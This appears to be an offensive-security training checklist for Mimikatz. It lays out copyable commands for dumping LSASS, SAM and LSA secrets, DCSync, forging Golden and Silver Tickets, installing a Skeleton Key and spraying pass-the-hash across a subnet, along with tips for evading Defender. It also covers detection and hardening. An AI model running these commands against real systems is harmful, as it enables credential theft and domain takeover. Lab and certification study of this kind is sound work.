# 🐱 Mimikatz: Complete Mastery Checklist

> **What is Mimikatz?** Mimikatz is the definitive Windows credential extraction tool. Written by Benjamin Delpy, it extracts plaintext passwords, NTLM hashes, Kerberos tickets, and other credentials directly from Windows memory (LSASS process), registry hives, and Active Directory. It is the tool most referenced in Windows post-exploitation documentation, CTF writeups, and security certifications.
>
> **Why does it exist?** Windows stores credentials in memory to support Single Sign-On (SSO) and seamless network authentication. Mimikatz exposes this design — reading the LSASS process memory reveals cached credentials for every user who has authenticated on the machine. This is a fundamental Windows security weakness, not a software bug.
>
> **When to use it:** After gaining Administrator or SYSTEM privileges on a Windows machine. During post-exploitation to harvest credentials for lateral movement. For Pass-the-Hash, Pass-the-Ticket, and Golden/Silver Ticket attacks. On Domain Controllers for DCSync (replicating all domain hashes). During red team exercises simulating credential theft.
>
> **When to avoid it:** Before gaining local admin/SYSTEM (most modules require elevated privileges). On heavily monitored endpoints with EDR (Mimikatz is one of the most-signatured tools in existence — use obfuscated versions or alternatives). When Credential Guard is enabled (blocks LSASS memory reads). For Linux targets (Windows-only tool).
>
> **What mastering Mimikatz unlocks:** Complete Windows credential extraction. Pass-the-Hash and Pass-the-Ticket lateral movement. Golden Ticket and Silver Ticket persistence. DCSync — the ability to replicate all AD hashes without touching LSASS. OSCP, CRTP, OSEP, and PNPT certification readiness.
>
> **Roadmap Phase:** Phase 4–5 (Post-Exploitation, Credential Access, Lateral Movement)

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

| Post-Exploitation | AD Attacks | Credential Access | C2 |
|:-----------------|:-----------|:-----------------|:---|
| [🐉 LinPEAS](LinPEAS.md) | [🩸 BloodHound](BloodHound.md) | [🔥 Hashcat](Hashcat.md) | [💀 Metasploit](Metasploit_Framework.md) |
| [🪟 WinPEAS](WinPEAS.md) | [🐍 Impacket](Impacket.md) | [🔑 John the Ripper](John_the_Ripper.md) | [🐍 Sliver](Sliver.md) |
| **🐱 Mimikatz** (you are here) | [🌐 NetExec](NetExec.md) | [📡 Responder](Responder.md) | [🪟 Evil-WinRM](Evil-WinRM.md) |

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals & Windows Credential Storage | 5 | 2–3 hours |
| 2 | Core Modules — logonpasswords, SAM, LSA | 6 | 5–7 hours |
| 3 | Intermediate — Kerberos Tickets & Pass Attacks | 6 | 5–7 hours |
| 4 | Advanced — DCSync, Golden/Silver Tickets | 5 | 5–8 hours |
| 5 | Tool Integration | 4 | 2–3 hours |
| 6 | Practical Labs | 4 | 6–10 hours |
| 7 | Evasion, Detection & Defense | 3 | 3–4 hours |
| 8 | Mastery Challenges | 3 | 5–8 hours |
| | **Total** | **36** | **~33–50 hours** |

**Prerequisites:** Local Administrator or SYSTEM on a Windows target. Understanding of NTLM authentication. Understanding of Kerberos (TGT/TGS). A Windows lab environment (a standalone Windows machine or AD domain).

**Alternatives:** Impacket `secretsdump` (remote NTDS/SAM dump without Mimikatz on target), NetExec `--sam`/`--lsa`/`--ntds` (remote credential extraction), CrackMapExec, Rubeus (Kerberos-specific, runs in-memory as .NET), `reg save` + offline secretsdump (stealthy local SAM dump).

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — How Windows Stores Credentials in Memory

- [ ] **Completed** · ⭐ Beginner · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand exactly where and why Windows stores credentials in memory, and why LSASS is the target. |
| **Skills Learned** | LSASS (Local Security Authority Subsystem Service) role, credential caching for SSO, WDigest authentication (stores plaintext in older Windows), NTLM vs Kerberos credential storage differences, what Credential Guard protects. |
| **Practical Exercise** | Open Process Explorer on Windows → find `lsass.exe` → note it runs as SYSTEM. Research: which Windows versions cache plaintext passwords in WDigest by default vs which require a registry change. Answer: Windows 8.1/2012R2+ disabled WDigest plaintext caching by default. |
| **Expected Output** | Written explanation of why LSASS is the crown jewel of Windows credential theft. Understanding that `sekurlsa::logonpasswords` reads LSASS memory to extract what is cached there. |
| **Common Mistakes** | Thinking Mimikatz "hacks" Windows — it reads legitimately stored credential material. On modern Windows with Credential Guard, even SYSTEM access cannot read LSASS credentials in the traditional way. |

### Task 1.2 — Mimikatz Architecture & Modules

- [ ] **Completed** · ⭐ Beginner · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand Mimikatz's module structure and know which module does what. |
| **Skills Learned** | Module categories: `sekurlsa` (LSASS memory), `lsadump` (SAM/AD/registry), `kerberos` (ticket operations), `token` (impersonation), `crypto` (certificate manipulation), `misc` (utilities). |
| **Practical Exercise** | Run `mimikatz` → `::` (list modules) → explore each module's commands: `sekurlsa::` → `lsadump::` → `kerberos::`. For each module, read the help output and note 3 key commands per module. |
| **Expected Output** | Module reference table with key commands. Understanding of when to use `sekurlsa` (live memory) vs `lsadump` (registry/offline). |

### Task 1.3 — Running Mimikatz: Execution Methods

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Know the multiple ways to run Mimikatz — on disk, in-memory, via C2, and remotely. |
| **Skills Learned** | Direct execution (`mimikatz.exe`), PowerShell in-memory (`Invoke-Mimikatz` from PowerSploit), Metasploit `kiwi` extension, Cobalt Strike `hashdump`/`logonpasswords`, via Evil-WinRM's `Invoke-Binary`. |
| **Practical Exercise** | Direct: download `mimikatz.exe` → run. In-memory via Evil-WinRM: `evil-winrm -i <target> -u admin -p pass -e /path/to/exe/` → `Invoke-Binary mimikatz.exe "sekurlsa::logonpasswords exit"`. |
| **Expected Output** | Two successful Mimikatz execution methods demonstrated. Understanding of why in-memory execution is preferred (avoids disk AV scanning). |
| **Common Mistakes** | Uploading mimikatz.exe directly to disk (immediately quarantined by Defender). Not using `exit` at the end of inline commands (Mimikatz hangs). |

### Task 1.4 — Privilege Escalation to SYSTEM (Required for Most Modules)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand why `privilege::debug` is the first command in every Mimikatz session and what it does. |
| **Skills Learned** | SeDebugPrivilege requirement (allows reading LSASS memory), `privilege::debug` effect, `token::elevate` to get SYSTEM token, why even local Administrators need `privilege::debug`. |
| **Practical Exercise** | In Mimikatz: `privilege::debug` → should return `Privilege '20' OK`. If it fails, you are not local admin. `token::elevate` → escalates to SYSTEM token. Then `sekurlsa::logonpasswords`. |
| **Expected Output** | `Privilege '20' OK` confirming SeDebugPrivilege. SYSTEM token obtained via `token::elevate`. |
| **Common Mistakes** | Running Mimikatz as a regular user (most modules fail without SeDebugPrivilege). Forgetting `privilege::debug` before other commands (errors with "no process found" or "access denied"). |

### Task 1.5 — Mimikatz on Modern vs Legacy Windows

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand how Mimikatz effectiveness varies across Windows versions and security features. |
| **Skills Learned** | WDigest disabled on Win8.1+ (no plaintext by default), Credential Guard (Win10/Server 2016+ with virtualization-based security — blocks LSASS reads), Protected Process Light (PPL) for LSASS (Win8.1+), how to check if Credential Guard is enabled. |
| **Practical Exercise** | `reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL` (PPL enabled if =1). `reg query HKLM\System\CurrentControlSet\Control\DeviceGuard` (Credential Guard config). On older Windows (Server 2008/2012): expect plaintext passwords from `logonpasswords`. On Win10/2019: expect hashes only. |
| **Expected Output** | Checklist of what Mimikatz can extract on each Windows version. Understanding that modern hardened Windows may only yield hashes (still useful for PTH). |

---

# PHASE 2: CORE MODULES

---

### Task 2.1 — sekurlsa::logonpasswords

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Extract all credentials cached in LSASS memory — the most commonly used Mimikatz command. |
| **Skills Learned** | Reading logonpasswords output (username, domain, NTLM hash, plaintext if available), identifying high-value accounts (domain admins, service accounts), extracting from multiple sessions. |
| **Practical Exercise** | `privilege::debug` → `sekurlsa::logonpasswords`. Parse output: find `Username`, `Domain`, `NTLM`, `Password` fields. Collect all NTLM hashes. Identify any plaintext passwords (legacy Windows or WDigest-enabled). |
| **Expected Output** | List of all cached credentials: usernames, NTLM hashes, and any plaintext passwords. |
| **Common Mistakes** | Not running `privilege::debug` first. Not saving output (pipe to file: `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > creds.txt`). Missing service account credentials (they may log in differently — check all sessions). |

### Task 2.2 — lsadump::sam (Local Account Hashes)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Dump local account password hashes from the SAM database. |
| **Skills Learned** | SAM vs LSASS distinction, `token::elevate` requirement, NTLM hash format from SAM output, using hashes for local admin PTH. |
| **Practical Exercise** | `privilege::debug` → `token::elevate` → `lsadump::sam`. Output shows local accounts and their NTLM hashes. Compare with `sekurlsa::logonpasswords` output. |
| **Expected Output** | Local Administrator NTLM hash. All local account hashes extracted. |
| **Common Mistakes** | Using `lsadump::sam` without `token::elevate` (requires SYSTEM, not just admin). Confusing local Administrator hash with domain Administrator hash (different accounts). |

### Task 2.3 — lsadump::lsa /patch (LSA Secrets)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Extract LSA secrets — stored service account passwords, DPAPI keys, cached domain credentials, and machine account hashes. |
| **Skills Learned** | What LSA secrets contain (service account plaintext passwords, scheduled task credentials, machine account hash `$MACHINE.ACC`), `/patch` vs `/inject` difference. |
| **Practical Exercise** | `privilege::debug` → `token::elevate` → `lsadump::lsa /patch`. Look for service account entries (`_SC_ServiceName`) and the machine account hash (`$MACHINE.ACC`). Machine account hash is used for Silver Ticket attacks. |
| **Expected Output** | Service account plaintext passwords (if stored). Machine account NT hash. DPAPI master key information. |
| **Common Mistakes** | Overlooking the machine account hash (`$MACHINE.ACC`) — it enables Silver Ticket attacks. Not checking `_SC_` prefixed entries (these are service account stored credentials). |

### Task 2.4 — sekurlsa::wdigest (Legacy Plaintext)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Extract WDigest-cached plaintext passwords on legacy or misconfigured Windows systems. |
| **Skills Learned** | WDigest protocol, registry key to re-enable it (`UseLogonCredential = 1`), which Windows versions have it enabled by default, checking if any domain machines still have WDigest enabled. |
| **Practical Exercise** | `sekurlsa::wdigest`. If output shows `Password : (null)` — WDigest is disabled. To enable for testing: `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1`. (Only do this in a lab — requires a new logon after enabling.) |
| **Expected Output** | Plaintext password from WDigest cache on legacy system. Understanding of when this works vs when hashes only are available. |

### Task 2.5 — sekurlsa::ekeys (Kerberos Encryption Keys)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Extract AES128/AES256 Kerberos session keys — used for stealthier Overpass-the-Hash (Pass-the-Key) attacks. |
| **Skills Learned** | `sekurlsa::ekeys` output, AES256 key vs NTLM hash, Overpass-the-Hash concept (using AES key to request Kerberos TGT instead of passing NTLM hash directly — generates less noisy network traffic). |
| **Practical Exercise** | `privilege::debug` → `sekurlsa::ekeys`. Collect AES256 keys alongside NTLM hashes. Use with Impacket: `impacket-getTGT -aesKey <AES256> domain/user@dc`. |
| **Expected Output** | AES256 keys extracted. Understanding of when to use Overpass-the-Hash vs Pass-the-Hash. |

### Task 2.6 — Log Everything: Output to File

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Objective** | Capture all Mimikatz output to a file for later analysis and reporting. |
| **Practical Exercise** | Method 1: `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > C:\Windows\Temp\mk.txt`. Method 2: Inside interactive Mimikatz: `log C:\Windows\Temp\mimikatz.log` → run commands → `log off`. Method 3: Redirect from PowerShell one-liner. |
| **Expected Output** | Complete Mimikatz output saved to file for offline analysis. |

---

# PHASE 3: KERBEROS TICKET OPERATIONS

---

### Task 3.1 — kerberos::list (Enumerate Tickets)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Objective** | List all Kerberos tickets currently stored in memory for the current session. |
| **Practical Exercise** | `kerberos::list` → see TGT and service tickets. `kerberos::list /export` → exports each ticket as a `.kirbi` file for use with PTT or Rubeus. |
| **Expected Output** | List of cached Kerberos tickets. `.kirbi` files exported to current directory. |

### Task 3.2 — kerberos::ptt (Pass-the-Ticket)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min

| Field | Detail |
|:---|:---|
| **Objective** | Inject a Kerberos ticket into the current session to authenticate as another user or service. |
| **Skills Learned** | Pass-the-Ticket concept (inject TGT/TGS to impersonate), `kerberos::ptt <ticket.kirbi>`, combining with `kerberos::list /export` from another session, using stolen admin TGT for lateral movement. |
| **Practical Exercise** | Export ticket from victim session: `kerberos::list /export` → copy `.kirbi` to attack session → `kerberos::ptt ticket.kirbi` → `klist` to verify ticket injected → `dir \\dc01\C$` to verify access. |
| **Expected Output** | Ticket injected into current session. Access to resources available to the ticket's owner. |
| **Common Mistakes** | Trying to PTT a service ticket for the wrong SPN (must match the target service). Not verifying with `klist` after injection. Clock skew > 5 min (Kerberos rejects old tickets). |

### Task 3.3 — sekurlsa::tickets /export (Harvest All Tickets)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Export ALL Kerberos tickets from LSASS memory — including tickets from other users' sessions. |
| **Skills Learned** | `sekurlsa::tickets /export` vs `kerberos::list /export` difference (sekurlsa reads from LSASS = all users; kerberos::list = only current user). Admin TGT value for PTT. |
| **Practical Exercise** | `privilege::debug` → `sekurlsa::tickets /export` → list all `.kirbi` files → identify high-value tickets (Administrator TGT, Domain Admin TGT) → `kerberos::ptt Administrator.kirbi` → verify access. |
| **Expected Output** | All users' Kerberos tickets exported. Admin TGT available for PTT. |

### Task 3.4 — Overpass-the-Hash (Pass-the-Key)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Use an NTLM hash to generate a full Kerberos TGT — avoiding NTLM network traffic (stealthier than PTH). |
| **Skills Learned** | `sekurlsa::pth` command, `/user`, `/domain`, `/ntlm`, `/run` parameters, how OPtH generates a Kerberos TGT from the hash, when OPtH is stealthier than direct PTH. |
| **Practical Exercise** | `sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:powershell.exe` → new PowerShell window opens running as Administrator with Kerberos tickets → `klist` to confirm TGT → access domain resources. |
| **Expected Output** | New process running as target user with a valid Kerberos TGT. Domain resources accessible without plaintext password. |

### Task 3.5 — Golden Ticket Attack

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min

| Field | Detail |
|:---|:---|
| **Objective** | Forge a Golden Ticket — a TGT signed by the KRBTGT hash — giving unlimited access to any service in the domain. |
| **Skills Learned** | Golden Ticket concept (forged TGT signed with KRBTGT hash), required info (KRBTGT hash, domain SID, target username), `kerberos::golden` command, persistence via Golden Ticket (survives password changes unless KRBTGT hash is rotated twice). |
| **Practical Exercise** | Get KRBTGT hash: `lsadump::dcsync /user:krbtgt` → note `/ntlm` hash and domain SID. Forge ticket: `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt`. Verify: `klist` shows forged TGT → `dir \\dc01\C$`. |
| **Expected Output** | Forged Golden Ticket injected. Full domain access with any username (including non-existent users). Access persists until KRBTGT hash is rotated twice. |
| **Common Mistakes** | Using wrong domain SID (lookup with `whoami /user` — remove last RID portion). Forgetting `/ptt` flag (ticket created but not injected). Not understanding that Golden Tickets are detected by modern EDR/SIEM on the ticket properties (PAC validation failures). |

### Task 3.6 — Silver Ticket Attack

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| Field | Detail |
|:---|:---|
| **Objective** | Forge a Silver Ticket — a service ticket signed by a service account/machine hash — for access to a specific service without contacting the DC. |
| **Skills Learned** | Silver Ticket concept (forged TGS for specific SPN), required info (service/machine NTLM hash, SPN, domain SID), stealthier than Golden Ticket (no DC contact), `kerberos::golden /service` syntax for Silver Tickets. |
| **Practical Exercise** | Get machine hash: `lsadump::lsa /patch` → note `$MACHINE.ACC` hash. Forge: `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:dc01.corp.local /service:cifs /rc4:<machine_hash> /ptt`. Verify: `dir \\dc01\C$`. |
| **Expected Output** | Silver Ticket for CIFS service on DC. Access to DC file share without contacting KDC. |

---

# PHASE 4: ADVANCED — DCSync & DOMAIN DOMINANCE

---

### Task 4.1 — lsadump::dcsync (DCSync Attack)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| Field | Detail |
|:---|:---|
| **Objective** | Replicate password hashes from the Domain Controller without ever touching LSASS on the DC — using the legitimate AD replication protocol. |
| **Skills Learned** | DCSync concept (MS-DRSR replication protocol abuse), required permissions (Domain Admin, Replication-Get-Changes-All, GenericAll on domain object), `/user` and `/domain` flags, dumping all hashes with `/all`. |
| **Practical Exercise** | From a machine with DA privileges: `lsadump::dcsync /user:Administrator` → get Administrator NTLM hash. `lsadump::dcsync /user:krbtgt` → get KRBTGT hash (needed for Golden Ticket). `lsadump::dcsync /domain:corp.local /all /csv` → dump all domain hashes to CSV. |
| **Expected Output** | Administrator NTLM hash. KRBTGT hash. All domain account hashes (replicated from DC). |
| **Common Mistakes** | Running DCSync from the DC itself is noisy — run it from a compromised domain member with DA rights instead. Not having Replication rights (need Domain Admin or delegated replication permissions identified via BloodHound). Not collecting KRBTGT hash for Golden Ticket capability. |

### Task 4.2 — lsadump::dcsync vs impacket-secretsdump

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Objective** | Understand when to use Mimikatz DCSync vs Impacket secretsdump and the tradeoffs of each. |
| **Skills Learned** | Mimikatz DCSync: on-target, requires DA on current machine. Impacket secretsdump: remote, runs from Linux attacker machine, also uses DCSync protocol. NTDS.dit extraction (offline method) vs live DCSync (online method). |
| **Practical Exercise** | Run both against the same DC: `lsadump::dcsync /user:Administrator` (from Mimikatz on target) AND `impacket-secretsdump corp.local/Administrator:pass@dc01` (from Kali). Compare output — should yield identical hashes. |
| **Expected Output** | Identical hashes from both methods. Understanding that Impacket secretsdump is often preferred (no Mimikatz on target = less AV risk). |

### Task 4.3 — LSASS Dump + Offline Extraction

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Create a memory dump of LSASS and extract credentials offline — avoiding running Mimikatz interactively on the target. |
| **Skills Learned** | `Task Manager → LSASS → Create Dump File` (GUI method), `procdump.exe -ma lsass.exe lsass.dmp` (Sysinternals), `rundll32 comsvcs.dll MiniDump <LSASS_PID> lsass.dmp full` (LOLBin method), offline extraction: `sekurlsa::minidump lsass.dmp` → `sekurlsa::logonpasswords`. |
| **Practical Exercise** | LOLBin dump: `tasklist | findstr lsass` → get PID → `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full` → download dmp → on attack machine: `mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit`. |
| **Expected Output** | LSASS dump file. Credentials extracted offline without interactive Mimikatz session on target. |
| **Common Mistakes** | Defender detecting the dump file by name (rename to something innocuous). Not downloading the dump before cleanup. Using procdump.exe directly (it is signatured — prefer the LOLBin `comsvcs.dll` method). |

### Task 4.4 — token::elevate and Impersonation

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Objective** | Use Mimikatz token manipulation to impersonate other users on the system. |
| **Skills Learned** | `token::elevate` (steal SYSTEM token), `token::whoami` (current token), `token::list` (all available tokens), `token::impersonate` (impersonate a specific user), `token::revert` (return to original token). |
| **Practical Exercise** | `token::elevate` → `token::whoami` (confirms SYSTEM) → `token::list` (see all available tokens including domain users with active sessions) → `token::impersonate /user:domainadmin` → `misc::cmd` (open cmd as that user). |
| **Expected Output** | SYSTEM token obtained. Domain Admin token impersonated (if they have a session on this machine). New command shell as impersonated user. |

### Task 4.5 — Skeleton Key Attack

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 40 min

| Field | Detail |
|:---|:---|
| **Objective** | Patch LSASS on a Domain Controller to install a skeleton key — a master password that works for all domain accounts alongside their real passwords. |
| **Skills Learned** | `misc::skeleton` command, what it does (patches LSASS on DC to accept `mimikatz` as a password for any account), detection risk (VERY noisy — LSASS patch visible to EDR), why it is impractical in real engagements. |
| **Practical Exercise** | On DC (requires DA + physical/remote access): `privilege::debug` → `misc::skeleton`. Test: `net use \\dc01\C$ /user:Administrator mimikatz`. The password `mimikatz` now works for ANY account until the DC reboots. |
| **Expected Output** | Skeleton key installed. Any domain account accessible with password `mimikatz`. |
| **Common Mistakes** | Using this in a real engagement (it patches LSASS in memory — extremely detectable, potentially destabilizing). Not understanding it resets on reboot (non-persistent). |

---

# PHASE 5: TOOL INTEGRATION

---

### Task 5.1 — Mimikatz → Hashcat (Crack Extracted Hashes)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min
| Field | Detail |
|:---|:---|
| **Objective** | Feed Mimikatz-extracted NTLM hashes into Hashcat for offline cracking. |
| **Practical Exercise** | Extract NTLM hashes from logonpasswords output → save to `hashes.txt` (one hash per line) → `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule` → cracked passwords feed back to Evil-WinRM or NetExec. |

### Task 5.2 — Mimikatz → BloodHound (Path Confirmation)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
| Field | Detail |
|:---|:---|
| **Objective** | Use BloodHound-identified attack paths with Mimikatz-extracted credentials to execute lateral movement. |
| **Practical Exercise** | BloodHound shows UserA has DCSync rights → extract UserA NTLM hash with Mimikatz logonpasswords → `lsadump::dcsync` as UserA → all domain hashes obtained. |

### Task 5.3 — Mimikatz → NetExec (PTH Spray)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
| Field | Detail |
|:---|:---|
| **Objective** | Use Mimikatz-extracted hashes with NetExec for network-wide PTH lateral movement. |
| **Practical Exercise** | Extract Administrator hash → `nxc smb 192.168.1.0/24 -u Administrator -H <hash>` → all machines using same local admin hash show `(Pwn3d!)` → Evil-WinRM to each. |

### Task 5.4 — Mimikatz via Metasploit kiwi Extension

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
| Field | Detail |
|:---|:---|
| **Objective** | Use Metasploit's built-in kiwi extension (based on Mimikatz) for credential extraction via a Meterpreter session. |
| **Practical Exercise** | In Meterpreter: `load kiwi` → `creds_all` (equivalent to logonpasswords) → `lsa_dump_sam` → `lsa_dump_secrets` → `golden_ticket_create`. |

---

# PHASE 6: PRACTICAL LABS

---

### Lab 6.1 — Metasploitable 2 / Windows Lab: logonpasswords Chain

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 2–3 hours
| Field | Detail |
|:---|:---|
| **Scenario** | Get a Windows shell via Metasploit → escalate to SYSTEM → run Mimikatz logonpasswords → collect all hashes → PTH to other machines. |
| **Success Criteria** | All local account hashes extracted. At least one PTH lateral movement demonstrated. |

### Lab 6.2 — HTB Machine: Monteverde (Azure AD + Mimikatz)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 3–4 hours
| Field | Detail |
|:---|:---|
| **Scenario** | HTB Monteverde — Azure AD Connect, credential extraction via Mimikatz or secretsdump from AD Connect service. |
| **Success Criteria** | Domain Admin credentials obtained via credential extraction chain. |

### Lab 6.3 — Home AD Lab: Full Golden Ticket Chain

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 3–4 hours
| Field | Detail |
|:---|:---|
| **Scenario** | Home AD lab. Compromise DA → DCSync KRBTGT hash → forge Golden Ticket → access domain as any user including non-existent accounts. |
| **Success Criteria** | Golden Ticket forged and verified working. Non-existent user account used to access domain resources. |

### Lab 6.4 — LSASS Offline Dump + Extraction

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 2–3 hours
| Field | Detail |
|:---|:---|
| **Scenario** | Windows target with Defender enabled. Dump LSASS using LOLBin method (`comsvcs.dll MiniDump`), transfer dump, extract credentials offline with Mimikatz on attack machine. |
| **Success Criteria** | Credentials extracted without running Mimikatz interactively on target. Defender not triggered. |

---

# PHASE 7: EVASION, DETECTION & DEFENSE

---

### Task 7.1 — AV/EDR Evasion for Mimikatz

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min
| Field | Detail |
|:---|:---|
| **Objective** | Understand and apply techniques to run Mimikatz despite active Defender/EDR. |
| **Skills Learned** | Obfuscated builds (recompiled with different strings), in-memory execution via Invoke-Mimikatz, LSASS dump + offline extraction (Task 4.3), using kiwi in Meterpreter, custom Mimikatz builds (BetterSafetyNet, etc.). |
| **Practical Exercise** | Attempt to run standard mimikatz.exe → Defender quarantines. Use LOLBin LSASS dump → extract offline → success. Document which methods bypassed detection and which were caught. |

### Task 7.2 — Detecting Mimikatz (Blue Team View)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
| Field | Detail |
|:---|:---|
| **Objective** | Understand how defenders detect Mimikatz usage. |
| **Skills Learned** | Event ID 4656 (LSASS handle request), Event ID 10 in Sysmon (process access to lsass.exe), LSASS PPL detection, memory integrity scanning, PowerShell Script Block Logging catching Invoke-Mimikatz, network detection of DCSync (Event ID 4662 + unusual replication source). |
| **Expected Output** | Detection rule: "Alert on any process accessing lsass.exe memory via Sysmon Event 10 where SourceImage is not a known system process." |

### Task 7.3 — Hardening Against Mimikatz

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
| Field | Detail |
|:---|:---|
| **Objective** | Know the defensive controls that reduce or eliminate Mimikatz effectiveness. |
| **Skills Learned** | Enable Credential Guard (Win10/Server 2016+), enable LSASS PPL (`RunAsPPL = 1`), disable WDigest (`UseLogonCredential = 0` — default on modern Windows), tiered admin model (DA never logs into workstations), Protected Users security group (disables NTLM, forces Kerberos), rotate KRBTGT hash periodically. |
| **Expected Output** | Hardening checklist. Understanding that even with all controls, DCSync is still possible if an account has replication rights. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Zero-to-Golden-Ticket

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 4–6 hours
Home AD lab. Starting from a low-priv domain user: escalate via WinPEAS → local admin → Mimikatz logonpasswords → PTH to DA machine → DCSync KRBTGT → Golden Ticket → persist. Document every step with timestamps.

### Challenge 8.2 — Defender-Active Credential Extraction

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 3–4 hours
Windows 10 target with Defender enabled and up-to-date signatures. Extract credentials without triggering Defender. Document the successful method and why each failed method was caught.

### Challenge 8.3 — DCSync Detection + Response Exercise

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 3 hours
Run DCSync against a home AD lab DC. Simultaneously monitor Splunk/Sysmon for detection. Document the exact events generated, build a detection rule, and document the IR response steps (identify scope, reset KRBTGT twice, force password resets).

---

## 🎓 Competency Matrix

| Skill | Beginner | Intermediate | Advanced |
|:------|:--------:|:------------:|:--------:|
| Explain LSASS credential storage | [ ] | | |
| Run privilege::debug and token::elevate | [ ] | | |
| sekurlsa::logonpasswords | [ ] | | |
| lsadump::sam | [ ] | | |
| lsadump::dcsync /user:krbtgt | | [ ] | |
| Pass-the-Hash with sekurlsa::pth | | [ ] | |
| Pass-the-Ticket with kerberos::ptt | | [ ] | |
| Golden Ticket creation and injection | | | [ ] |
| Silver Ticket creation | | | [ ] |
| LSASS offline dump + extraction | | [ ] | |
| Defender evasion for credential extraction | | | [ ] |
| DCSync detection rule writing | | [ ] | |

---

## 💬 Interview Questions

1. What is LSASS and why is it the primary target for Windows credential extraction?
2. Why does `privilege::debug` need to be run before most Mimikatz commands?
3. What is the difference between `sekurlsa::logonpasswords` and `lsadump::sam`?
4. What is DCSync and what AD permissions are required to perform it?
5. How does a Golden Ticket differ from a Silver Ticket?
6. What is Overpass-the-Hash and when is it stealthier than Pass-the-Hash?
7. What is Credential Guard and how does it prevent Mimikatz from extracting credentials?
8. How would you extract credentials from a target where Defender blocks Mimikatz on disk?
9. What Windows event IDs would a defender use to detect DCSync activity?
10. What is the KRBTGT account and why does its hash need to be rotated twice after a Golden Ticket compromise?
